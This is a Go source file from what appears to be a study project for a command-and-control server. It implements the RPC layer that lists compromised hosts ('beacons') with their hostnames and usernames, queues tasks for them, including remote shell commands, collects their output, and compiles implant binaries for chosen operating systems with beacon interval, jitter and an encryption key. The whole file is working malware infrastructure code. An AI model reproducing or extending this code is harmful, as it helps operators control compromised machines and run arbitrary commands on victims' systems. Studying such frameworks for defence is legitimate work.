package rpc

import (
	"fmt"
	"time"

	"xhc2_for_studying/protocol"
	serverConfig "xhc2_for_studying/server/config"
	"xhc2_for_studying/server/core"
	"xhc2_for_studying/server/generate"
	"xhc2_for_studying/server/store"
)

// C2RPC exposes C2 operations to the gRPC adapter. It delegates to the same
// stores and server configuration that the HTTP C2 listener uses.
type C2RPC struct {
	BeaconStore  store.BeaconStore
	TaskStore    store.ServerTaskStore
	SessionStore *store.SessionStore
	ImplantStore store.ImplantStore
	Config       *serverConfig.ServerConfig
	BuildImplant ImplantBuildFunc
}

// ImplantBuildFunc compiles an implant for a GenerateImplant request.
type ImplantBuildFunc func(GenerateImplantBuildRequest) (*GenerateImplantBuildResult, error)

// GenerateImplantBuildRequest is the normalized build request passed to the
// implant generation backend.
type GenerateImplantBuildRequest struct {
	ServerURL       string
	PathPrefix      string
	Interval        int64
	Jitter          int64
	GOOS            string
	GOARCH          string
	ServerPublicKey string
	C2Profile       *protocol.C2Profile
	ImplantStore    store.ImplantStore
}

// GenerateImplantBuildResult is the compiled implant returned by the backend.
type GenerateImplantBuildResult struct {
	Digest string
	Binary []byte
}

// ListBeacons returns a snapshot of all registered beacons.
func (s *C2RPC) ListBeacons(_ Empty, reply *[]BeaconInfo) error {
	ids := s.BeaconStore.ListIDs()
	out := make([]BeaconInfo, 0, len(ids))
	for _, id := range ids {
		b, err := s.BeaconStore.Get(id)
		if err != nil {
			continue
		}
		out = append(out, BeaconInfo{
			ID:          b.ID,
			Hostname:    b.Hostname,
			Username:    b.Username,
			OS:          b.OS,
			Arch:        b.Arch,
			Interval:    b.Interval,
			Jitter:      b.Jitter,
			LastCheckIn: b.LastCheckIn,
		})
	}
	*reply = out
	return nil
}

// ListTasks returns all pending tasks across all beacons.
func (s *C2RPC) ListTasks(_ Empty, reply *[]TaskInfo) error {
	ids := s.BeaconStore.ListIDs()
	out := make([]TaskInfo, 0)
	for _, bid := range ids {
		tasks := s.TaskStore.GetPendingTasksByImplantID(bid)
		for _, t := range tasks {
			out = append(out, TaskInfo{
				TaskID:    t.TaskID,
				ImplantID: t.ImplantID,
				Type:      t.Type,
				Status:    t.Status,
			})
		}
	}
	*reply = out
	return nil
}

// CreateTask validates the request, looks up the target beacon, creates a new
// ServerTask in pending status, and returns the generated task ID.
func (s *C2RPC) CreateTask(req CreateTaskRequest, reply *CreateTaskResponse) error {
	switch req.TaskType {
	case protocol.TaskTypeNoop, protocol.TaskTypeWhoami, protocol.TaskTypeShell:
	default:
		return fmt.Errorf("unknown task type: %s", req.TaskType)
	}

	if _, err := s.BeaconStore.Get(req.ImplantID); err != nil {
		return fmt.Errorf("beacon not found: %s", req.ImplantID)
	}

	task := &core.ServerTask{
		TaskID:    fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:      req.TaskType,
		ImplantID: req.ImplantID,
		Payload:   req.Payload,
		Status:    protocol.TaskStatusPending,
	}
	if err := s.TaskStore.AddTask(task); err != nil {
		return err
	}
	reply.TaskID = task.TaskID
	return nil
}

// GenerateImplant builds a new implant from server defaults plus request
// overrides, records its server-side metadata, and returns the binary.
func (s *C2RPC) GenerateImplant(req GenerateImplantRequest, reply *GenerateImplantResponse) error {
	buildReq, err := s.normalizeGenerateRequest(req)
	if err != nil {
		return err
	}

	build := s.BuildImplant
	if build == nil {
		build = defaultBuildImplant
	}

	result, err := build(buildReq)
	if err != nil {
		return err
	}
	reply.Digest = result.Digest
	reply.Binary = result.Binary
	reply.Filename = implantFilename(buildReq.GOOS, buildReq.GOARCH)
	return nil
}

// GetTaskResult looks up a task by its ID and returns the full result
// including output, status, and completion timestamp.
func (s *C2RPC) GetTaskResult(req TaskResultRequest, reply *TaskResultResponse) error {
	task, err := s.TaskStore.GetTask(req.TaskID)
	if err != nil {
		return fmt.Errorf("task not found: %s", req.TaskID)
	}

	reply.TaskID = task.TaskID
	reply.Type = task.Type
	reply.ImplantID = task.ImplantID
	reply.Status = task.Status
	reply.Error = task.Error
	reply.Output = task.Result.Output
	if !task.CompletedAt.IsZero() {
		reply.Completed = task.CompletedAt.Format(time.RFC3339)
	}
	return nil
}

func (s *C2RPC) normalizeGenerateRequest(req GenerateImplantRequest) (GenerateImplantBuildRequest, error) {
	if s == nil || s.Config == nil {
		return GenerateImplantBuildRequest{}, fmt.Errorf("server config is not initialized")
	}
	if s.ImplantStore == nil {
		return GenerateImplantBuildRequest{}, fmt.Errorf("implant store is not initialized")
	}

	defaults := s.Config.GenerateDefaults
	buildReq := GenerateImplantBuildRequest{
		ServerURL:       firstNonEmpty(req.ServerURL, defaults.ServerURL),
		PathPrefix:      firstNonEmpty(req.PathPrefix, defaults.PathPrefix),
		Interval:        firstPositive(req.Interval, defaults.Interval),
		Jitter:          firstOptionalInt64(req.Jitter, defaults.Jitter),
		GOOS:            firstNonEmpty(req.GOOS, defaults.GOOS),
		GOARCH:          firstNonEmpty(req.GOARCH, defaults.GOARCH),
		ServerPublicKey: s.Config.AgePublicKey,
		C2Profile:       s.Config.C2Profile,
		ImplantStore:    s.ImplantStore,
	}
	if buildReq.ServerURL == "" {
		return GenerateImplantBuildRequest{}, fmt.Errorf("server_url is required")
	}
	if buildReq.Interval <= 0 {
		return GenerateImplantBuildRequest{}, fmt.Errorf("interval must be greater than zero")
	}
	if buildReq.Jitter < 0 {
		return GenerateImplantBuildRequest{}, fmt.Errorf("jitter must be greater than or equal to zero")
	}
	if buildReq.GOOS == "" {
		return GenerateImplantBuildRequest{}, fmt.Errorf("goos is required")
	}
	if buildReq.GOARCH == "" {
		return GenerateImplantBuildRequest{}, fmt.Errorf("goarch is required")
	}
	return buildReq, nil
}

func defaultBuildImplant(req GenerateImplantBuildRequest) (*GenerateImplantBuildResult, error) {
	result, err := generate.GenerateAndBuildEmbeddedBytes(
		req.ServerURL,
		req.PathPrefix,
		req.Interval,
		req.Jitter,
		req.ServerPublicKey,
		req.C2Profile,
		req.ImplantStore,
		req.GOOS,
		req.GOARCH,
	)
	if err != nil {
		return nil, err
	}
	return &GenerateImplantBuildResult{
		Digest: result.Digest,
		Binary: result.Binary,
	}, nil
}

func firstNonEmpty(value, fallback string) string {
	if value != "" {
		return value
	}
	return fallback
}

func firstPositive(value, fallback int64) int64 {
	if value > 0 {
		return value
	}
	return fallback
}

func firstOptionalInt64(value *int64, fallback int64) int64 {
	if value != nil {
		return *value
	}
	return fallback
}

func implantFilename(goos, goarch string) string {
	name := fmt.Sprintf("implant-%s-%s", goos, goarch)
	if goos == "windows" {
		name += ".exe"
	}
	return name
}
